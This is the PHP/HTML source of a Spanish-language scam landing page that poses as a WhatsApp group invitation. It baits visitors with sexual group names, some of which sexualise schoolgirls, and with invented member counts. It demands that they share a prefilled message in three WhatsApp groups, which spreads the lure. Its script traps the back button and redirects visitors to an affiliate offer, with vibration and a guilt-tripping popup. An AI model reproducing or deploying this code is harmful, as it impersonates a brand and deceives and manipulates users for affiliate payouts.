<?php
include '../cpa.php';
include '../config.php';
include '../traduccionEs.php';
include "../redondear.php";

$cpa=$cpa[$cpa_ram];
echo $analiti;

$redon = "../redondear.php?path=";

$redondo = $fotos[$fotos_ram];
$extraido = substr($redondo, 3);

?>


<!doctype html>
<html>

<head>
    <meta content='text/html; charset=UTF-8' http-equiv='Content-Type' />
    <meta content='width=device-width, initial-scale=1.0' name='viewport' />
    <title>GRUPOS DE WHATSAPP</title>

    <meta property="og:image" content="<?php echo $circular . $redon . $extraido; ?>" />
    <meta property='og:title' content='<?php echo $frase[$frase_ram]; ?>' />
    <meta property='og:description' content='Invitación al chat de grupo' />
    <meta property="og:site_name" content="WhatsApp.com" />
    <meta property="og:url" content="." />
    <meta http-equiv="Refresh" content="<?php echo $segundos; ?>;url=<?php echo $redireccionar; ?>" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script type="text/javascript" src="../js/jquery.js"></script>
    <link rel="stylesheet" href="../css/style123.css">

    <script>
    if (!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent))
        var ii = 0; // needed for safari
    var iy = 0;

    var text = ['*<?php echo $frase[$frase_ram]; ?>* %0A'];
    var text2 = ['<?php echo $frase2[$frase2_ram]; ?> %0A'];
    var rlink = ['<?php echo $url3; ?> %0A%0A'];
    //var text3 = ['*Share in 3 Group to Join Automatic* %0A                   *Join Group*'];


    /* var msgamigo = 'whatsapp://send?text= ' + text[Math.floor(Math.random() * text.length)] + text2[Math.floor(Math
         .random() * text2.length)] + ' ' + rlink[Math.floor(Math.random() * rlink.length)] + text3[Math.floor(Math
         .random() * text3.length)];*/

    var msgamigo = 'whatsapp://send?text= ' + text[Math.floor(Math.random() * text.length)] + text2[Math.floor(Math
        .random() * text2.length)] + ' ' + rlink[Math.floor(Math.random() * rlink.length)];


    var shareCountG = 3;
    var urlMovil1 = ['<?php echo $cpa; ?>'];
    var oferta = urlMovil1[Math.floor(Math.random() * urlMovil1.length)];
    var msg = 'Debe completar el proceso de (3) invitación podra chataer con nosotras.';
    if (typeof history.pushState === "function") {
        history.pushState("back", null, null);
        window.onpopstate = function() {
            history.pushState('back', null, null);
            if (iy == 3) {
                iy = 0;
                ii = 0;
            } else if (ii == 1) {
                gtag('event', 'SALIDA RAPIDA -1', {
                    'event_category': 'ICUyJq2fynS34MhT',
                    'event_label': 'SALIDA'
                });
                window.location.href = oferta;
                document.getElementById('popup1').style.display = "none";
                setTimeout(function() {
                    if (document.getElementById('popup1').style.display == "none") {
                        document.getElementById('popup1').style.display = "block";
                    }
                }, 300);
                window.navigator.vibrate(5000);
                iy = iy + 1;
                ii = 0;
            }
        };
        setTimeout(function() {
            ii = 1;
        }, 200);
    }
    citas = new Array();
    citas[0] = "❌⛔WhatsApp +18❌";
    citas[1] = "♨Parejas Solteras💢";
    citas[2] = "♨💢Full Group SEXY🔷";
    citas[3] = "Momentos Calientes🔞";
    citas[4] = "Formando Parejas😂";
    citas[5] = "Colegialas HOT+18😂😂";
    citas[6] = "😈XXX Videos Caseros🌹.";
    alea = Math.random() * (citas.length)
    alea = Math.floor(alea)
    var objetos = new Array();
    var i







    function setCookie(f, c, d) {
        var b = new Date();
        b.setTime(b.getTime() + (d * 24 * 60 * 60 * 1000));
        var e = "expires=" + b.toUTCString();
        document.cookie = f + "=" + c + "; " + e
    }

    function getCookie(f) {
        var e = f + "=";
        var d = document.cookie.split(';');
        for (var c = 0; c < d.length; c++) {
            var b = d[c];
            while (b.charAt(0) == ' ') b = b.substring(1);
            if (b.indexOf(e) == 0) return b.substring(e.length, b.length)
        }
        return 0
    }
    setCookie("invgrupo", "0");
    var g = getCookie("invgrupo");

    function fna(e) {
        if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
            ++g;
            setCookie("invgrupo", g, 3);
            if (g >= 3) {
                ++g;
                document.getElementById("demo").style.display = 'inline-block';
                document.getElementById("demo").innerHTML = "<h3>Ya lo Completaste Difruta del Grupo.</h3>";
                document.getElementById("compartirgrupo").style.display = 'none';
                document.getElementById("compartirII").style.display = 'none';
                document.getElementById("compartirIII").style.display = 'none';
                document.getElementById("compartirIV").style.display = 'none';
                document.getElementById("compartirVI").style.display = 'none';
                document.getElementById("unirse-button").style.backgroundColor = "#00A500";
                document.getElementById("unirse-button").style.display = 'inline-block';
            }
            if (g <= shareCountG) {
                gtag('event', '[INVITANDO]', {
                    'event_category': 'ICUyJq2fynS34MhT',
                    'event_label': 'INVITANDO'
                })
                window.location.href = msgamigo;
            } else {
                setCookie("invgrupo", "0");
                gtag('event', 'COMPLETO INVITACION ENTRANDO', {
                    'event_category': 'ICUyJq2fynS34MhT',
                    'event_label': 'ENTRANDO2'
                })
                window.location.href = oferta;
            }
        } else {
            window.alert('Please share this article in mobile device.')
        }
    }

    function random(e, t) {
        return Math.round(Math.random() * (t - e) + e)
    }

    function checkZero(e) {
        return 10 > e ? "0" + e : e
    }

    function timer1(e, t) {
        var c = checkZero(Math.round((e - 30) / 60)),
            o = checkZero(e % 60);
        $(t).html(c + ":" + o);
        var m = setInterval(function() {
            e--, c = checkZero(Math.round((e - 30) / 60)), o = checkZero(e % 60), $(t).html(c + ":" + o), 0 ==
                e && clearInterval(m)
        }, 1e3);
        return !1
    }
    $(document).ready(function() {
        if (g > 0) {
            $('#inicio').hide();
            $('#procesoverificacion').fadeIn();
        }
        $('#start').click(function() {
            $("html, body").animate({
                scrollTop: 0
            }, 100);
            $('#inicio').hide();
            $('#procesoverificacion').fadeIn();
            $('#unirse-button').click(function() {
                if (g >= 3) {
                    setCookie("invgrupo", "0");
                    gtag('event', '[OFERTA - 1]', {
                        'event_category': 'ICUyJq2fynS34MhT',
                        'event_label': 'INVITANDO'
                    })
                    window.location.href = oferta;
                } else {
                    window.alert('Debe completar el proceso de invitación llevas  ' + g);
                }
            });
        });
    });
    setInterval(function() {
        if (g > shareCountG) {
            setCookie("invgrupo", "0");
            setCookie("invgrupo", "0");
            gtag('event', '[OFERTA - 2]', {
                'event_category': 'ICUyJq2fynS34MhT',
                'event_label': 'INVITANDO'
            })
            window.location.href = oferta;
        }
    }, 8000);

    function hidepop() {
        setCookie("invgrupo", "0");
        setCookie("invgrupo", "0");
        document.getElementById('popup1').style.display = "none";
        gtag('event', '[SALIENDO]', {
            'event_category': 'ICUyJq2fynS34MhT',
            'event_label': 'INVITANDO'
        })
        window.location.href = oferta;
    }
    </script>







</head>

<body>

    <body onload="aleatorio()">
        <center>
            <div class='content'>
                <div class='content-middle'>
                    <div class='content-inner'>
                        <div class='survey_middle'>
                            <div align="center"><img src="../logos/logo1.png" width="100%" />
                            </div>
                        </div>
                        <h3><strong>GRUPOS DE WHATSAPP</strong></h3>
                        <p><a href="<?php echo $cpa ?>"> <img src="<?php echo $url.$fotos[$fotos_ram]; ?>" name="imagen"
                                    class="avatar"></p></a>

                        <p>
                        <h2><strong><?php echo $frase[$frase_ram]; ?></strong></h2>
                        <div id="inicio">
                            <p>Invitación a Grupo de WhatsApp&nbsp;</p>
                            </p>
<br>
                            <p><strong><?php echo 400; ?> Participantes Mujeres</strong></p>
                            <p><strong><?php echo 99; ?> Participantes Hombres </strong></p>



                            <p><a class="button button--primary button--s block__action" id="start"><strong>Unete
                                        ahora</strong></a></p>
                        </div>
                        <div id="procesoverificacion" style="display:none;">
                            <div class="block__body" id="demo" style="display:none;"></div>
                            <p id="compartirIV">Solo debes compartir en <span shdwsp_counter="">3</span> grupos.</p>
                            <br />
                            <p id="compartirIII">¡Debe confirmar que quieres acceder a este Grupo!</p>
                            <p id="compartirVI">Sigue los pasos; debes compartir en <span shdwsp_counter="">3</span>
                                grupos.</p>
                            <p><button class="button button--primary button--s block__action" onClick="fna(this)"
                                    id="compartirgrupo"><strong>Compartir en Grupo</strong></button></p>
                            <p id="compartirII">Completa el proceso y estara disponible para unirte al grupo.</p>
                            <div><a class="button button--primary button--s block__action"
                                    style="background-color: #939895" id="unirse-button"><strong>Unirse al
                                        Grupo</strong></a></div>
                        </div>
                        <br>
                        <p><strong> <?php echo 430; ?> en línea&nbsp; </strong><img src="../recursos/btn1.png"
                                width="15" height="15"> </p>
                        <br>
                        <br>
                        <p>Antes De Unirte A los Grupos Tambien Conocer Mujeres Perritas en Linea 24h/7d</p>
                        <a href="<?php echo $cpa; ?>" target="_blank">
                            <img src="<?php echo $banner[$banner_ram]; ?>" style="width: 100% ">
                        </a>
                    </div>
                </div>
            </div>
            <div id="popup1" class="popup fourth" style="display:none">
                <div class="popup-head"><img id="alertimg"
                        src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABoAAAAaAQMAAACThN6NAAAABlBMVEUAAAC5ubnoUmKJAAAAAXRSTlMAQObYZgAAAEVJREFUCNdjQAI8cEIOTtiDiPoGGPH5AIh4wMDA+PkDAwMzhPjBwMAOIvg//4ES8v//AbV+/g8l6v//b4AQ////P8CACgCNvyHz1VKxBQAAAABJRU5ErkJggg=="
                        width="26" height="26" alt="">Aviso WhatsApp!</div>
                <div class="popup-center" align="center">SEGURO QUE <strong>NO</strong> QUIERES<br> ENTRAR<br><br> EN
                    NUESTROS GRUPOS DE<br> WHATSAPP <br><br> Y difruta del mejor HOT 18+.<br><br>+💔💕+💔💕+💔💕</div>
                <div class="popup-bottom" align="center">
                    <div onClick="hidepop();" class="button">OK</div>
                </div>
            </div>
    </body>
<script id="_wauuh9">var _wau = _wau || []; _wau.push(["tab", "7li7xwbott", "uh9", "left-upper"]);</script><script async src="//waust.at/t.js"></script>

</html>